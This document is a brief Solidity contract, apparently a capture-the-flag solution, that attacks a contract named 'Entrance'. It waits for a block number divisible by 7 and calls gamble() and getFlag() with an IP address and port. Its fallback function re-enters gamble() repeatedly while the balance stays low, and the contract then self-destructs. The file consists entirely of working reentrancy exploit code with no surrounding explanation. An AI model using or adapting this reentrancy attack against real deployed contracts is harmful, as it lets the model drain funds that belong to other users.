pragma solidity >=0.4.21 <0.6.0;

import "./entrance.sol";
import "./SafeMath.sol";

contract EnterAgain {
    using SafeMath for *;

    uint256 counter = 0;
    address a;

    constructor(address _a) {
        a = _a;
    }

    function enter() {
        uint b = block.number;
        require((b).mod(7) == 0, "wrong block number");
        Entrance entrance = Entrance(a);
        entrance.enter(1);
        entrance.gamble();
        entrance.getFlag("151.217.239.78", "6656");
        selfdestruct(0x0);
    }

    function() {
        Entrance entrance = Entrance(a);
        if(entrance.balances(this) <= 30) {
            entrance.gamble();
        }
    }
}
